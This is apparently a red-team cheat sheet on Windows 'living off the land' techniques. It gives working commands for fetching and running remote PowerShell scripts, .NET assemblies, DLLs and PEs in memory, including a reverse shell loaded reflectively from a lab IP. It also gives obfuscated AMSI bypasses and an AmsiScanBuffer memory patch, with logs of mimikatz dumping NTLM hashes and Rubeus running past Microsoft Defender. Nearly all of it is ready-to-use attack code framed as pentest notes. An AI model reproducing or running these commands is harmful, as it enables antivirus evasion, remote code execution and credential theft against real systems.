---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths:
   => C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
   => C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe

➤ The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. 
  You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
  
   => ieexec.exe https://www.example.org/file.exe

Important note: the executable files are downloaded and stored in the folder "C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\"


		
================================================================================================================================================================
III.  Basic examples of 'Living off the land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
================================================================================================================================================================

PowerShell is built on .NET and it natively allows to download and execute straight in-memory:
➤ PowerShell scripts
➤ .Net Assemblies (PE and DLL)
   Examples
    > Method 1 - Add assembly with Add-Type cmdletPermalink
    > Method 2 - Add assembly with Reflection Assembly
    > Method 3 - Add assembly via a string objectPermalink

In addition, with PowerShell, we can also download and execute straight in-memory any Windows PE and DLL by using the reflective PE/DLL injection methods.


---------------------------------------------------------------------------------------------------------------------------------------------------
2.1. How to download and execute straight in-memory a PowerShell script hosted remotely on a Web server
---------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> powershell -exec bypass
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/PowerShell-Script.ps1'); PoSH-script-function-name
- OR -
PS C:\temp> powershell -exec bypass
PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
- OR -
C:\temp> echo IEX(New-Object Net.WebClient).DownloadString('http://Your-IP-address/PowerShell-Script.ps1') | powershell -noprofile - 
- OR -
C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
         iwr('http://Your-IP-address/PowerShell-Script.ps1')|iex"

---------------------------------------------------------------------------------------------------------------------------------------------------
2.2. How to download and execute straight in-memory a ".Net" executable using PowerShell
---------------------------------------------------------------------------------------------------------------------------------------------------

PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
- - - - - - - - - - - - - - - - - - - - - - - - - - -
PS C:\temp> $PEtoload = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/SharpUp.exe')
PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($PEtoload);
PS C:\temp> $entryPointMethod = $assembly.GetType('SharpUp.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('audit', '')));

=== SharpUp: Running Privilege Escalation Checks ===
[*] Already in high integrity, no need to privesc!
[*] Audit mode: running an additional 0 check(s).
[*] Note: Running audit mode in high integrity will yield a large number of false positives.
[-] Not vulnerable to any of the 0 checked modules.
[*] Completed Privesc Checks in 0 seconds


PoC with a reverseshell "revshell.exe" (C#)
- - - - - - - - - - - - - - - - - - - - - - - - - - -
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/revshell.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())


---------------------------------------------------------------------------------------------------------------------------------------------------
2.3. How to download and execute straight in-memory a ".NET" DLL using PowerShell
---------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\temp> $class = $assem.GetType("MyLibrary.Class1")
PS C:\temp> $method = $class.GetMethod("AwesomeFunctionName")
PS C:\temp> $method.Invoke(0, $null)

(note : https://github.com/crypt0jan/ClassLibrary1)

OR

+ Step 1 - Get a Base64 encoded string of the DLL
PS C:\temp> [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))

+ Step 2 - Embed assembly string in script 
PS C:\temp> $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
PS C:\temp> [System.Reflection.Assembly]::Load($bytes)


================================================================================================================================================================
IV.  Basic examples of 'Living off the land' techniques using Python (i.e. load & execute straight in-memory PE/DLL/scripts)
================================================================================================================================================================

Python can be used to load & execute straight in-memory python scripts and PE and DLL files (unmanaged code using 'PythonMemoryModule' or native code using 'ironpython').

Note: On Windows machines, to use Python you can install it or download a portable version. 

➤ Python official website
  + https://www.python.org/downloads/
➤ Python embeddable package providing a signed (portable) Python interpreter with a good reputation:
  + https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip
➤ IronPython 3.4 interpreter installer:
  + https://github.com/IronLanguages/ironpython3/releases/tag/v3.4.1
➤ ...

---------------------------------------------------------------------------------------------------------------------------------------------------
3.1. How to download and execute straight in-memory a Python script hosted remotely on a Web server
---------------------------------------------------------------------------------------------------------------------------------------------------

Basic PoC/example
-----------------
PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortable.zip -OutFile IronPythonPortable.zip
PS C:\Users\Administrator> tar -xf .\IronPythonPortable.zip

PS C:\Users\Administrator\IronPython\net462> ipy.exe

IronPython 3.4.2 (3.4.2.1000)
[.NETFramework,Version=v4.6.2 on .NET Framework 4.8.4785.0 (64-bit)] on win32
Type "help", "copyright", "credits" or "license" for more information.

#Python3
import urllib.request
request = urllib.request.Request('https://X.X.X.X/python-script.py')
result = urllib.request.urlopen(request)
payload = result.read()
exec(payload)


---------------------------------------------------------------------------------------------------------------------------------------------------
3.2. How to download and execute straight in-memory a .DLL file (unamanaged code) using the Python script hosted remotely on a Web server
---------------------------------------------------------------------------------------------------------------------------------------------------

In the following example a .dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint using the 'PythonMemoryModule'.
-> https://github.com/naksyn/PythonMemoryModule

Example:
--------
PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
PS C:\temp> tar -xf .\python.zip
PS C:\temp> .\python.exe

#Python3
import urllib.request
import ctypes
import pythonmemorymodule
request = urllib.request.Request('http://X.X.X.X/example.dll')
result = urllib.request.urlopen(request)
buf=result.read()
dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
startDll = dll.get_proc_addr('StartW')
assert startDll()
#dll.free_library()


---------------------------------------------------------------------------------------------------------------------------------------------------
3.3. How to download and execute straight in-memory a PE file (unamanaged code) using the Python script hosted remotely on a Web server
---------------------------------------------------------------------------------------------------------------------------------------------------

In the following example a PE file is downloaded (not saved on disk), loaded and executed in-memory.
-> https://github.com/naksyn/PythonMemoryModule

Example:
--------
PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
PS C:\temp> tar -xf .\python.zip
PS C:\temp> .\python.exe

#Python3
import urllib.request
import ctypes
import pythonmemorymodule
request = urllib.request.Request('http://X.X.X.X/example.exe')
result = urllib.request.urlopen(request)
buf=result.read()
pythonmemorymodule.MemoryModule(data=buf, debug=True, command = 'insert-PE-command')



================================================================================================================================================================
V.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
================================================================================================================================================================

As a reminder, AMSI bypass techniques are needed to execute hacking tools without being detected by security products (AV) only if we use during our pentest/red team engagements
.NET managed code (C# assemblies) and scripting languages such as Powershell, VBS, Javascript and VBA macros. 
Public AMSI bypass techniques mainly use memory patches or vectored exception handlers with e.g. hardware breakpoints to manipulate the scan or initialisation process at runtime. 
Some others rely on manipulating the DLL load process - either when AMSI hasn't been initialised yet or for newly spawned processes.
Most of the public AMSI bypasses are detected by antivirus/EDR solutions however they can get modified to get around signature based detections.

You will find below a few examples, tests and PoCs for common AMSI bypass techniques:
--------------------------------------------------------------------------------------
➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
➤ AMSI bypass technique 4 - Using hardwarebreakpoint on "AmsiScanBuffer"
➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
➤ AMSI bypass technique 7 - AMSI dll hijacking
➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 

Usefull ressources:
--------------------
➤ https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html
➤ https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
➤ https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
➤ https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-amsi-bypass/
➤ https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
➤ http://amsi.fail
➤ ...


***************************************************************************************************************************************************
➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
***************************************************************************************************************************************************

By forcing the AMSI initialization to fail (amsiInitFailed) no AMSI scan will be initiated for the current powershell process.
However, keep in mind that this AMSI bypass technique works only for PowerShell scripts. It won't work to load C# assemblies like Rubeus and Certify. 
Though, you can still run offensive tools developed with unmanaged code (e.g., C/C++) embeded in PowerShell scripts via reflected code loading in-memory.

Note: This AMSI bypass method is not "OpSec safe".

=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
=> https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
=> http://amsi.fail

----------------------------------------------------------------------------------------------
PoC 1 - AMSI bypass test on a Windows Server 2022 protected by the MS Defender antivirus
----------------------------------------------------------------------------------------------

┌──(auditor㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <snip>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.20348.2849
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.20348.2849
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
                                                  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 3:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> [Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" 
					          						-f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" 
						 							-f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" 
						  							-f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);

=> To verify that the AMSI has been successfully bypassed we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimikatz
The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, 
verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

=> We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.

*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.ps1');

*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimi-custom

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 195153 (00000000:0002fa51)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SERVER-WIN2022
Logon Server      : SERVER-WIN2022
Logon Time        : 5/2/2025 11:25:21 AM
SID               : S-1-5-21-3336774573-1234467604-3718094125-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SERVER-WIN2022
         * NTLM     : 6699270562fdbd1e74c7d369c<SNIP>
         * SHA1     : 62c9d420fbebe8aca4f082465<SNIP>
         * DPAPI    : 62c9d420fbebe8aca4f082465<SNIP>
        tspkg :

----------------------------------------------------------------------------------------------
PoC 2 - AMSI bypass test on a Windows 10 laptop protected by the MS Defender antivirus
----------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\pentester> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.19041.5737
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.5737
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


PS C:\Users\pentester> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
		       			AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/1/2025 6:27:04 AM


PS C:\Users\pentester> $JAyqn6s6=$null;$strnuz2n20=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076));$jmwijlxcxmaddpv="+[chAR](90+17)+[CHAr]([BYTe]0x64)+[Char]([BYTe]0x6f)+[ChaR]([bytE]0x61)
+[Char](108*104/104)+[CHAR](113*29/29)+[ChaR](104+89-89)+[CHar]([BYTe]0x6d)+[ChAR](103*65/65)+[cHaR]([BytE]0x71)+[CHAr]([bYte]0x66)+[ChAr]([BytE]0x61)+[ChaR]([Byte]0x77)+[ChaR](107+15-15)+[chaR]([bYte]0x74)";
[Threading.Thread]::Sleep(1250);[Ref].Assembly.GetType("System.$([char](19+58)+[ChAR](97+62-62)+[cHar](110)+[CHar](97)+[chaR](103*20/20)+[chAr]([bYTE]0x65)+[CHAr](109*43/43)+
[chAr](101)+[cHar](82+28)+[ChAR]([BYTe]0x74)).$([cHaR]([bytE]0x41)+[chAr](53+64)+[chaR]([bYte]0x74)+[cHar](79+32)+[cHaR]([ByTe]0x6d)+[ChaR](97)+
[chAr]([bYTe]0x74)+[chaR]([BYTe]0x69)+[cHaR]([BYte]0x6f)+[cHAr](110)).$([cHAR]([BYtE]0x41)+[CHaR]([ByTE]0x6d)+[CHAr](5+110)+[cHar]([BYTE]0x69)+[ChAR](85+27-27)+[ChAR]([BYTe]0x74)+[ChAR]([bYTE]0x69)+
[ChaR]([ByTE]0x6c)+[chAr](17+98))").GetField("$(('ämsíSèssî'+'ôn').noRMalIZe([ChAr](70)+[chAR](111*10/10)+[ChaR](114)+[CHaR](109+88-88)+[cHAR](68)) 
-replace [ChAR](92+68-68)+[ChaR](112*49/49)+[chAr](123+75-75)+[chAr]([bYTe]0x4d)+[ChaR](37+73)+[cHAR]([bYtE]0x7d))", 
"NonPublic,Static").SetValue($JAyqn6s6, $JAyqn6s6);[Ref].Assembly.GetType("System.$([char](19+58)+[ChAR](97+62-62)+[cHar](110)+[CHar](97)+[chaR](103*20/20)+[chAr]([bYTE]0x65)+[CHAr](109*43/43)+[chAr](101)+
[cHar](82+28)+[ChAR]([BYTe]0x74)).$([cHaR]([bytE]0x41)+[chAr](53+64)+[chaR]([bYte]0x74)+[cHar](79+32)+[cHaR]([ByTe]0x6d)+[ChaR](97)+[chAr]([bYTe]0x74)+[chaR]([BYTe]0x69)+
[cHaR]([BYte]0x6f)+[cHAr](110)).$([cHAR]([BYtE]0x41)+[CHaR]([ByTE]0x6d)+[CHAr](5+110)+[cHar]([BYTE]0x69)+[ChAR](85+27-27)+[ChAR]([BYTe]0x74)+[ChAR]([bYTE]0x69)+
[ChaR]([ByTE]0x6c)+[chAr](17+98))").GetField("$([cHaR]([bYte]0x61)+[ChaR]([byTE]0x6d)+[chAR]([ByTE]0x73)+[CHaR]([BYte]0x69)+[CHAr](11+56)+[chAr]([bYtE]0x6f)+
[CHAr](110*90/90)+[ChAr]([bYTE]0x74)+[cHAr]([BYTe]0x65)+[chaR](21+99)+[ChAr](62+54))", "NonPublic,Static").SetValue($JAyqn6s6, [IntPtr]$strnuz2n20);$phlxvsitgqbxld="";[Threading.Thread]::Sleep(79)                                                                                                                                                                    

PS C:\Users\pentester>

=> To verify that the AMSI has been successfully bypassed we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

PS C:\Users\pentester> invoke-mimikatz                                                                                                                          
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, 
or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\pentester>

=> We can now download and execute any malicious scripts and tools such as the hacking script 'PowerUp' for this PoC.

PS C:\Users\pentester> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks              
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

<SNIP>


***************************************************************************************************************************************************
➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
***************************************************************************************************************************************************

Patching the "Amsi.dll" in memory (AmsiScanBuffer) is an effective technique but more and more AV/EDR products are able to detect this technique 
via memory scan.

--------------------------------------------------------------------------------------------------------------------------------
PoC n°1 - Patching the "Amsi.dll" in memory (AmsiScanBuffer) on a Windows Server 2022 protected by the MS Defender antivirus
          (Test as a local admin user logged with PowerShell remoting)
--------------------------------------------------------------------------------------------------------------------------------

To successfully patch the AMSI.dll in the PowerShell remoting session, I used a well known PowerShell script (containing C# code) that I obfuscated and splitted 
in 3 parts before loading it from a remote Web server. 
Doing so allowed me to execute my malicious script that patch the AMSI.dll without being blocked by the Microsoft Defender AV running on the Windows computer. 


┌──(auditor㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <snip>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.20348.2849
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.20348.2849
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
						  						  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 3:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part1.ps1');
*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part2.ps1');
True
*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part3.ps1');

*Evil-WinRM* PS C:\Users\Administrator\Documents>

=> The AMSI.dll has been patched. We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.

*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.ps1');


*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimi-custom

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 195153 (00000000:0002fa51)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SERVER-WIN2022
Logon Server      : SERVER-WIN2022
Logon Time        : 5/2/2025 11:25:21 AM
SID               : S-1-5-21-3336774573-1234467604-3718094125-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SERVER-WIN2022
         * NTLM     : 6699270562fdbd1e74c7d369c<SNIP>
         * SHA1     : 62c9d420fbebe8aca4f082465<SNIP>
         * DPAPI    : 62c9d420fbebe8aca4f082465<SNIP>
        tspkg :
<SNIP>


------------------------------------------------------------------------------------------------------------------------------
PoC n°2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer) on a Windows 10 laptop protected by the MS Defender antivirus
          (Test as a local administrator user but without an elevated shell)
------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.19041.5737
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.5737
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
			   			   AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/1/2025 6:27:04 AM


PS C:\Users\Administrator> ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwA
>> NAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgA
>> zADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQB
>> yAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA
>> 7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIA
>> BJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAM
>> wAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQ
>> AcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0A
>> CAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
PS C:\Users\Administrator> Add-Type ${_/==\_/\__/===\_/}
PS C:\Users\Administrator> ${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA=')))+
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
PS C:\Users\Administrator> ${/==\_/=\/\__/\/\/} = 0
PS C:\Users\Administrator> [Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
True
PS C:\Users\Administrator> ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
PS C:\Users\Administrator> [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)

PS C:\Users\Administrator>

=> To verify that the AMSI has been successfully patched we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

PS C:\Users\Administrator> invoke-mimikatz
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was
included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException


=> We can now download and execute any malicious scripts and tools such as the hacking tool 'Rubeus' for this PoC.

PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Rubeus.ps1');

PS C:\Users\Administrator> invoke-rubeus

cmdlet Invoke-Rubeus at command pipeline position 1
Supply values for the following parameters:
Command: help

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        DreiKopfHund.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] 
        [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
        [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        DreiKopfHund.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe
